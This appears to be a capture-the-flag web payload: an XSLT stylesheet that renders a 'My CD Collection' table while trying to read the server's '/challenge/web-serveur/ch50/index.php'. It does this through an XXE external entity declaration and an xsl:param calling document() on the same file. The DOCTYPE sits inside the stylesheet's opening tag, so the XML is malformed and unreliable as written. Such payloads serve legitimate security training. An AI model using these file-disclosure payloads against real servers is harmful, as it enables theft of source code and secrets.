<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
<!DOCTYPE request [
	<!ENTITY include SYSTEM "/challenge/web-serveur/ch50/index.php">
]>
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:template match="/">
  <h2>My CD Collection</h2>
  <table border="1">
    <tr bgcolor="#9acd32">
      <th style="text-align:left">Title</th>
      <th style="text-align:left">Artist</th>
    </tr>
    <xsl:for-each select="catalog/cd">
    <tr>
      <td><xsl:value-of select="title" /></td>
      <td><xsl:value-of select="artist" /></td>
    </tr>
    </xsl:for-each>
  </table>
  
</xsl:template>
<xsl:param name="file2" select="document('/challenge/web-serveur/ch50/index.php')"/>

</xsl:stylesheet>